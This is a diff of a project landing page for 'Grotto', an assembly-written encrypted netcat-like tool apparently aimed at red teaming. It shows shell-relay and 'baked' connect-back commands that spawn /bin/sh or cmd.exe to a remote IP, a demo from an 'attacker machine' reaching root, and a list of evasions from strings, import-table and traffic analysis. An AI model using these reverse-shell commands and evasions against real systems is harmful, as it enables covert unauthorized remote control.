-            ~3,800 lines of handwritten x86_64 assembly. Every component implemented from scratch &mdash; no libraries, no dependencies, no shortcuts.
-        </p>
-
-        <div class="capabilities">
-            <div class="capability"><span class="cap-dot api"></span> PEB Walking</div>
-            <div class="capability"><span class="cap-dot api"></span> ror13 Hash Resolution</div>
-            <div class="capability"><span class="cap-dot api"></span> GetProcAddress Fallback</div>
-            <div class="capability"><span class="cap-dot api"></span> Raw Linux Syscalls</div>
-            <div class="capability"><span class="cap-dot net"></span> TCP Socket Layer</div>
-            <div class="capability"><span class="cap-dot net"></span> recv_exact / send_all</div>
-            <div class="capability"><span class="cap-dot net"></span> Winsock2 via PEB</div>
-            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Quarter-Round</div>
-            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Block Cipher</div>
-            <div class="capability"><span class="cap-dot chacha"></span> ChaCha20 Stream XOR</div>
-            <div class="capability"><span class="cap-dot aead"></span> Poly1305 MAC (mod 2&#xB9;&#xB3;&#x2070;-5)</div>
-            <div class="capability"><span class="cap-dot aead"></span> AEAD Encrypt</div>
-            <div class="capability"><span class="cap-dot aead"></span> AEAD Decrypt + Verify</div>
-            <div class="capability"><span class="cap-dot exec"></span> SystemFunction036 Nonce</div>
-            <div class="capability"><span class="cap-dot exec"></span> getrandom Nonce</div>
-            <div class="capability"><span class="cap-dot exec"></span> CreateProcessA Pipes</div>
-            <div class="capability"><span class="cap-dot exec"></span> fork/execve/dup2 Pipes</div>
-            <div class="capability"><span class="cap-dot relay"></span> poll(2) Event Loop</div>
-            <div class="capability"><span class="cap-dot relay"></span> Threaded Relay</div>
-            <div class="capability"><span class="cap-dot relay"></span> POLLHUP Drain Logic</div>
-        </div>
-        <div class="cap-legend">
-            <span><span class="cap-dot api" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> API Resolution</span>
-            <span><span class="cap-dot net" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Networking</span>
-            <span><span class="cap-dot chacha" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> ChaCha20</span>
-            <span><span class="cap-dot aead" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> AEAD</span>
-            <span><span class="cap-dot exec" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Execution</span>
-            <span><span class="cap-dot relay" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Relay</span>
-        </div>
-    </section>
-
-    <!-- ════════════ ARCHITECTURE ════════════ -->
-    <section id="architecture">
-        <h2>Wire protocol &amp; data flow.</h2>
-        <p class="section-desc">
-            Every message is independently encrypted with a fresh 96-bit nonce. The Poly1305 MAC authenticates the
-            ciphertext per RFC 8439 &mdash; any tampered byte is silently rejected.
-        </p>
-
-        <div class="arch-diagram">
-            <div class="arch-bar">
-                <span class="terminal-dot"></span>
-                <span class="terminal-dot"></span>
-                <span class="terminal-dot"></span>
-                <span class="arch-bar-label">grotto &mdash; wire protocol</span>
-            </div>
-            <div class="arch-body">
-                <div class="flow-diagram">
-                    <div class="flow-node">
-                        <div class="flow-node-box">grotto -l</div>
-                        <div class="flow-node-label">Listener</div>
-                    </div>
-                    <div class="flow-arrows">
-                        <div class="flow-arrow">
-                            <div class="flow-arrow-line"></div>
-                            <span class="flow-tag tcp">raw TCP</span>
-                        </div>
-                        <div class="flow-arrow left">
-                            <span class="flow-tag enc">encrypted</span>
-                            <div class="flow-arrow-line"></div>
-                        </div>
-                        <div class="flow-arrow">
-                            <div class="flow-arrow-line"></div>
-                            <span class="flow-tag enc">encrypted</span>
-                        </div>
-                    </div>
-                    <div class="flow-node">
-                        <div class="flow-node-box">grotto -c</div>
-                        <div class="flow-node-label">Client</div>
-                    </div>
-                </div>
-
-                <hr class="arch-divider">
-
-                <div class="wire-label">Wire Format (per message)</div>
-                <div class="wire-bar">
-                    <div class="wire-seg len">
-                        <span class="wire-seg-name">len</span>
-                        <span class="wire-seg-detail">4B &middot; LE u32</span>
-                    </div>
-                    <div class="wire-seg nonce">
-                        <span class="wire-seg-name">nonce</span>
-                        <span class="wire-seg-detail">12B &middot; random</span>
-                    </div>
-                    <div class="wire-seg ct">
-                        <span class="wire-seg-name">ciphertext</span>
-                        <span class="wire-seg-detail">N bytes &middot; ChaCha20</span>
-                    </div>
-                    <div class="wire-seg mac">
-                        <span class="wire-seg-name">mac</span>
-                        <span class="wire-seg-detail">16B &middot; Poly1305</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ════════════ CROSS-PLATFORM ════════════ -->
-    <section id="platforms">
-        <h2>One protocol, two platforms.</h2>
-        <p class="section-desc">
-            Shared crypto core with platform-specific networking, I/O, and shell execution.
-            Linux and Windows binaries interoperate seamlessly over the same encrypted wire protocol.
-        </p>
-
-        <div class="platform-grid">
-            <div class="platform-card">
-                <h3 style="color: var(--green);">Linux &mdash; ~13 KB static ELF</h3>
-                <div class="platform-item"><span class="p-dot linux"></span> Raw syscalls via syscall instruction</div>
-                <div class="platform-item"><span class="p-dot linux"></span> poll(2) multiplexed bidirectional relay</div>
-                <div class="platform-item"><span class="p-dot linux"></span> fork/execve/dup2 shell spawning</div>
-                <div class="platform-item"><span class="p-dot linux"></span> getrandom for CSPRNG nonces</div>
-                <div class="platform-item"><span class="p-dot linux"></span> No libc, no dynamic linking</div>
-            </div>
-            <div class="platform-card">
-                <h3 style="color: var(--blue);">Windows &mdash; ~8 KB minimal PE</h3>
-                <div class="platform-item"><span class="p-dot win"></span> PEB walk + ror13 API resolution</div>
-                <div class="platform-item"><span class="p-dot win"></span> CreateThread + WaitForMultipleObjects relay</div>
-                <div class="platform-item"><span class="p-dot win"></span> CreateProcessA with pipe redirection</div>
-                <div class="platform-item"><span class="p-dot win"></span> SystemFunction036 for CSPRNG nonces</div>
-                <div class="platform-item"><span class="p-dot win"></span> Zero DLL imports, zero strings</div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ════════════ QUICK START ════════════ -->
-    <section id="quick-start">
-        <h2>Build and connect.</h2>
-        <p class="section-desc">
-            Generate a 256-bit pre-shared key. Build both targets. Connect with the same key on both ends &mdash;
-            every message encrypted with ChaCha20-Poly1305 AEAD.
-        </p>
-
-        <div class="terminal">
-            <div class="terminal-bar">
-                <span class="terminal-dot"></span>
-                <span class="terminal-dot"></span>
-                <span class="terminal-dot"></span>
-                <span class="terminal-label">bash &mdash; build &amp; connect</span>
-            </div>
-            <div class="terminal-body">
-<span class="c"># Build both targets (generates random PSK)</span>
-<span class="p">$</span> ./build.sh
-
-<span class="c"># Generate a 256-bit PSK</span>
-<span class="p">$</span> KEY=<span class="v">$(python3 -c "import secrets; print(secrets.token_hex(32))")</span>
-
-<span class="c"># Listener (wait for connection)</span>
-<span class="p">$</span> ./grotto <span class="f">-l -p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span>
-
-<span class="c"># Client (connect to listener)</span>
-<span class="p">$</span> ./grotto <span class="f">-c</span> <span class="v">10.10.14.1</span> <span class="f">-p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span>
-
-<span class="c"># Encrypted shell relay</span>
-<span class="p">$</span> ./grotto <span class="f">-l -p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span> <span class="f">-e</span> <span class="s">/bin/sh</span>
-            </div>
-        </div>
-
-        <div style="margin-top: 48px;">
-            <h3 style="font-family: 'JetBrains Mono', monospace; color: var(--mauve); font-size: 16px; margin-bottom: 12px;">Baked Builds</h3>
-            <p class="section-desc" style="margin-bottom: 20px;">
-                Compile configuration directly into the binary &mdash; no CLI arguments needed, nothing visible in the process list.
-            </p>
-
-            <div class="terminal">
-                <div class="terminal-bar">
-                    <span class="terminal-dot"></span>
-                    <span class="terminal-dot"></span>
-                    <span class="terminal-dot"></span>
-                    <span class="terminal-label">bash &mdash; baked builds</span>
-                </div>
-                <div class="terminal-body">
-<span class="c"># Baked connect-back with encrypted shell</span>
-<span class="p">$</span> ./build.sh <span class="f">--baked -c</span> <span class="v">10.10.14.1</span> <span class="f">-p</span> <span class="v">443</span> <span class="f">-e</span> <span class="s">cmd.exe</span>
-
-<span class="c"># Baked listener</span>
-<span class="p">$</span> ./build.sh <span class="f">--baked -l -p</span> <span class="v">4444</span> <span class="f">-e</span> <span class="s">/bin/sh</span>
-
-<span class="c"># Binary runs with zero arguments</span>
-<span class="p">$</span> ./grotto  <span class="c"># config embedded at compile time</span>
-                </div>
-            </div>
-        </div>
-    </section>
-
-</div>
-
-<!-- ════════════ FOOTER ════════════ -->
-<footer class="site-footer">
-    <div class="container">
-        <p class="footer-tagline">Pure assembly. Fully encrypted. Cross-platform.</p>
-        <p class="footer-sub">Grotto &mdash; ChaCha20-Poly1305 encrypted networking in ~8 KB</p>
-        <div class="footer-links">
+    <!-- Nav -->
+    <nav class="nav"><div class="nav-inner">
+        <a href="#" class="nav-logo">Grotto</a>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#architecture">Architecture</a>
             <a href="https://github.com/Real-Fruit-Snacks/Grotto">GitHub</a>
-            <a href="#architecture">Documentation</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Grotto/issues">Issues</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Grotto/releases/latest" class="nav-cta">Download</a>
         </div>
-        <p class="footer-copy">x86_64 NASM &middot; Linux + Windows &middot; RFC 8439 AEAD &middot; PEB Walking &middot; Raw Syscalls</p>
-        <p class="footer-toolkit">
-            Part of the Real-Fruit-Snacks security toolkit:
-            <a href="https://github.com/Real-Fruit-Snacks/Tidepool">Tidepool</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Riptide">Riptide</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Cascade">Cascade</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/HydroShot">HydroShot</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a> &middot;
-            <a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a> &middot;
-            <strong style="color: var(--subtext0);">Grotto</strong>
-        </p>
-    </div>
-</footer>
+    </div></nav>
 
+    <!-- Hero -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-logo animate"><img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-dark.svg" alt="Grotto"></div>
+            <h1 class="hero-tagline animate" style="transition-delay:.1s">Encrypted netcat. Pure assembly.</h1>
+            <p class="hero-desc animate" style="transition-delay:.2s">ChaCha20-Poly1305 AEAD encryption over TCP. Cross-platform Linux and Windows binaries in pure x86_64 NASM. Zero dependencies, zero imports, ~8 KB on disk.</p>
+            <div class="hero-ctas animate" style="transition-delay:.3s">
+                <a href="https://github.com/Real-Fruit-Snacks/Grotto/releases/latest" class="btn-primary">Download Latest</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Grotto" class="btn-secondary">View Source</a>
+            </div>
+            <div class="terminal animate-scale" style="transition-delay:.4s">
+                <div class="terminal-bar">
+                    <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
+                    <span class="terminal-label">grotto</span>
+                </div>
+                <div class="terminal-body"><pre><span class="t-m"># Generate 256-bit pre-shared key</span>
+<span class="t-g">$</span> KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
+
+<span class="t-m"># Listener with encrypted shell relay</span>
+<span class="t-g">$</span> ./grotto -l -p 4444 -k $KEY -e /bin/sh
+<span class="t-b">[*] listening on 0.0.0.0:4444</span>
+<span class="t-b">[*] connection from 10.10.14.3</span>
+<span class="t-b">[*] shell relay active — encrypted bidirectional</span>
+
+<span class="t-m"># Connect from attacker machine</span>
+<span class="t-g">$</span> ./grotto -c 10.10.10.5 -p 4444 -k $KEY
+<span class="t-p">id</span>
+<span class="t-b">uid=0(root) gid=0(root)</span></pre></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats -->
+    <div class="container">
+        <div class="stats animate">
+            <div class="stat"><div class="stat-num" data-suffix="KB" data-target="8" data-prefix="~">0</div><div class="stat-label">Binary</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num">ChaCha20</div><div class="stat-label">Poly1305</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-target="2">0</div><div class="stat-label">Platforms</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-target="0">0</div><div class="stat-label">Dependencies</div></div>
+        </div>
+        <div class="gradient-line"></div>
+    </div>
+
+    <!-- Features Bento -->
+    <section id="features">
+        <div class="container">
+            <div class="section-label animate">FEATURES</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Encrypted networking from scratch</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Full AEAD encryption, cross-platform assembly, shell relay, and zero dependencies in under 13 KB.</p>
+
+            <div class="bento">
+                <div class="bento-card bento-hero animate" style="transition-delay:.1s">
+                    <h3>AEAD Encryption</h3>
+                    <p>Full RFC 8439 ChaCha20-Poly1305 in pure x86_64 assembly. 256-bit pre-shared key, random 12-byte nonce per message, authenticated ciphertext. Tampered payloads silently rejected.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ./grotto -l -p 4444 -k $KEY<br><span class="t-b">[*] listening on 0.0.0.0:4444</span><br><span class="t-b">[*] connection from 10.10.14.3</span><br><span class="t-b">[*] AEAD relay active</span></div>
+                </div>
+                <div class="bento-card bento-stat animate" style="transition-delay:.18s">
+                    <div class="big">~8<span style="font-size:24px">KB</span></div>
+                    <div class="label">Windows PE</div>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.2s">
+                    <h3 style="color:var(--mauve)">Cross-Platform</h3>
+                    <p>Linux ELF (~13 KB) and Windows PE (~8 KB) from shared crypto core. Same wire protocol — full interoperability between platforms.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.28s">
+                    <h3 style="color:var(--green)">PEB Walking</h3>
+                    <p>All Windows APIs resolved at runtime via PEB walk and ror13 hash matching. No import table, no API name strings — 25 functions across kernel32, ws2_32, advapi32.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.36s">
+                    <h3 style="color:var(--peach)">Raw Syscalls</h3>
+                    <p>Linux binary uses direct syscall instructions. No libc, no dynamic linking, fully static ELF. Socket, bind, connect, poll — all via kernel interface.</p>
+                </div>
+                <div class="bento-card bento-stat animate" style="transition-delay:.1s">
+                    <div class="big" style="color:var(--teal)">0</div>
+                    <div class="label">Dependencies</div>
+                </div>
+                <div class="bento-card bento-hero animate" style="transition-delay:.18s">
+                    <h3 style="color:var(--red)">Encrypted Shell (-e)</h3>
+                    <p>Spawn <code>cmd.exe</code> or <code>/bin/sh</code> with stdin/stdout piped through the AEAD channel. Full bidirectional relay — every keystroke and response authenticated and encrypted.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ./grotto -l -p 4444 -k $KEY -e /bin/sh<br><span class="t-b">[*] shell relay active</span><br><span class="t-p">whoami</span><br><span class="t-b">root</span></div>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.26s">
+                    <h3 style="color:var(--yellow)">Threaded + Poll</h3>
+                    <p>Windows uses <code>CreateThread</code> with <code>WaitForMultipleObjects</code> for concurrent relay. Linux uses <code>poll(2)</code> for single-threaded multiplexed I/O.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.34s">
+                    <h3 style="color:var(--teal)">Connect / Listen</h3>
+                    <p>Standard netcat-style modes. Listen for inbound connections or connect out to a target. Bidirectional encrypted relay on every byte.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Capabilities -->
+    <section style="background:var(--mantle)">
+        <div class="container">
+            <div class="section-label animate">CAPABILITIES</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Built from the ground up</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Every byte hand-written in NASM. No compiler, no runtime, no dependencies.</p>
+            <div class="pills">
+                <div class="pill animate"><span class="dot dot-g"></span>ChaCha20</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Poly1305</div>
+                <div class="pill animate"><span class="dot dot-g"></span>AEAD</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Connect Mode</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Listen Mode</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Shell Relay</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Linux ELF</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Windows PE</div>
+                <div class="pill animate"><span class="dot dot-g"></span>PEB Walking</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Raw Syscalls</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Zero Imports</div>
+                <div class="pill animate"><span class="dot dot-g"></span>No libc</div>
+                <div class="pill animate"><span class="dot dot-y"></span>Threaded (Win)</div>
+                <div class="pill animate"><span class="dot dot-y"></span>Poll (Linux)</div>
+            </div>
+            <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)">
+                <span style="color:var(--green)">&#9679;</span> Both Platforms &nbsp;
+                <span style="color:var(--yellow)">&#9679;</span> Platform-Specific
+            </div>
+        </div>
+    </section>
+
+    <!-- Architecture -->
+    <section id="architecture">
+        <div class="container">
+            <div class="section-label animate">ARCHITECTURE</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Four-layer design</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Shared crypto core with platform-specific networking and I/O. ~3,800 lines of handwritten x86_64 NASM.</p>
+            <div class="arch-grid">
+                <div class="arch-card animate" style="transition-delay:.1s"><div class="arch-num">1</div><h3>Crypto Core</h3><p>ChaCha20 quarter-round, block generation, stream XOR. Poly1305 mod 2^130-5 with 128-bit partial products. AEAD envelope per RFC 8439 Section 2.8. Shared between both platforms via <code>.inc</code> includes.</p></div>
+                <div class="arch-card animate" style="transition-delay:.2s"><div class="arch-num">2</div><h3>Network Layer</h3><p>Linux: raw <code>socket</code>/<code>bind</code>/<code>accept</code>/<code>connect</code> syscalls. Windows: Winsock2 via PEB-resolved <code>ws2_32.dll</code>. Both support listen and connect modes with identical wire protocol.</p></div>
+                <div class="arch-card animate" style="transition-delay:.3s"><div class="arch-num">3</div><h3>Platform I/O</h3><p>Linux: <code>poll(2)</code> event loop multiplexing socket and stdin/pipe. Windows: <code>CreateThread</code> with dual worker threads and <code>WaitForMultipleObjects</code> for concurrent bidirectional relay.</p></div>
+                <div class="arch-card animate" style="transition-delay:.4s"><div class="arch-num">4</div><h3>Shell Relay</h3><p>Linux: <code>fork</code>/<code>execve</code>/<code>dup2</code> with pipe redirection. Windows: <code>CreateProcessA</code> with <code>STARTUPINFO</code> pipe handles. Both pipe shell I/O through the AEAD channel.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Getting Started -->
+    <section style="background:var(--mantle)">
+        <div class="container">
+            <div class="section-label animate">GETTING STARTED</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Build from source</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">NASM assembler + platform linker. Both targets build in under a second.</p>
+            <div class="two-col">
+                <div class="terminal animate" style="transition-delay:.1s">
+                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">build</span></div>
+                    <div class="terminal-body"><pre><span class="t-g">$</span> git clone https://github.com/Real-Fruit-Snacks/Grotto.git
+<span class="t-g">$</span> cd Grotto && make all
+
+<span class="t-m"># Or use the build script (generates random PSK)</span>
+<span class="t-g">$</span> ./build.sh
+
+<span class="t-g">$</span> ls -la build/
+<span class="t-b">grotto      13288  (Linux ELF)</span>
+<span class="t-b">grotto.exe   8192  (Windows PE)</span></pre></div>
+                </div>
+                <div class="terminal animate" style="transition-delay:.25s">
+                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage</span></div>
+                    <div class="terminal-body"><pre><span class="t-m"># Encrypted listener with shell</span>
+<span class="t-g">$</span> ./grotto -l -p 4444 -k $KEY -e /bin/sh
+
+<span class="t-m"># Connect to encrypted listener</span>
+<span class="t-g">$</span> ./grotto -c 10.10.10.5 -p 4444 -k $KEY
+
+<span class="t-m"># Pipe data through encrypted channel</span>
+<span class="t-g">$</span> echo "secret" | ./grotto -c host -p 4444 -k $KEY
+
+<span class="t-m"># Baked build — zero CLI arguments</span>
+<span class="t-g">$</span> ./build.sh --baked -c 10.10.14.1 -p 443 -e cmd.exe</pre></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Detection -->
+    <section>
+        <div class="container">
+            <div class="section-label animate">DETECTION AWARENESS</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Know the boundaries</h2>
+            <div class="two-col" style="margin-top:32px">
+                <div class="detect-card detect-hidden animate" style="transition-delay:.1s">
+                    <h3>Hidden From</h3>
+                    <ul>
+                        <li><code>strings</code> — no API names, encrypted wire format</li>
+                        <li>Import table analysis — no DLL imports (Windows PE)</li>
+                        <li>Passive traffic monitoring — all data AEAD encrypted</li>
+                        <li>Binary size heuristics — ~8 KB within normal range</li>
+                    </ul>
+                </div>
+                <div class="detect-card detect-visible animate" style="transition-delay:.2s">
+                    <h3>Visible To</h3>
+                    <ul>
+                        <li><code>strace</code>, <code>eBPF</code> — syscall tracing reveals behavior</li>
+                        <li>Network metadata — connection endpoints, timing, volume</li>
+                        <li>Static analysis — disassembly reveals crypto patterns</li>
+                        <li>Memory forensics — key material in process memory</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-line"></div>
+            <div class="footer-grid">
+                <div><h4>Documentation</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Grotto#quick-start">Quick Start</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto#features">Features</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto#architecture">Architecture</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto#security">Security</a></li></ul></div>
+                <div><h4>Resources</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/releases/latest">Latest Release</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/issues">Report Issue</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/blob/main/CONTRIBUTING.md">Contributing</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/blob/main/CHANGELOG.md">Changelog</a></li></ul></div>
+                <div><h4>Security</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/security/advisories">Advisories</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Grotto/blob/main/SECURITY.md">Policy</a></li><li><a href="https://datatracker.ietf.org/doc/html/rfc8439">RFC 8439</a></li></ul></div>
+                <div><h4>License</h4><p>MIT License<br>Copyright &copy; 2026<br>Real-Fruit-Snacks</p></div>
+            </div>
+            <div class="footer-bottom">Real-Fruit-Snacks</div>
+        </div>
+    </footer>
+
+    <script>
+    // Scroll animations
+    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){el.target.classList.add('visible');obs.unobserve(el.target)}})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
+    document.querySelectorAll('.animate,.animate-scale').forEach(el=>obs.observe(el));
+
+    // Counter animation
+    function countUp(el){const t=parseInt(el.dataset.target),s=el.dataset.suffix||'',p=el.dataset.prefix||'',d=1500,st=performance.now();function u(n){const pr=Math.min((n-st)/d,1),e=1-Math.pow(1-pr,3);el.textContent=p+Math.floor(t*e)+s;if(pr<1)requestAnimationFrame(u)}requestAnimationFrame(u)}
+    const sobs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){if(el.target.dataset.target!==undefined){countUp(el.target)}sobs.unobserve(el.target)}})},{threshold:.5});
+    document.querySelectorAll('.stat-num[data-target]').forEach(el=>sobs.observe(el));
+
+    // Nav scroll
+    window.addEventListener('scroll',()=>{document.querySelector('.nav').style.borderBottomColor=window.scrollY>20?'rgba(49,50,68,0.8)':'rgba(49,50,68,0.3)'});
+    </script>
 </body>
 </html>
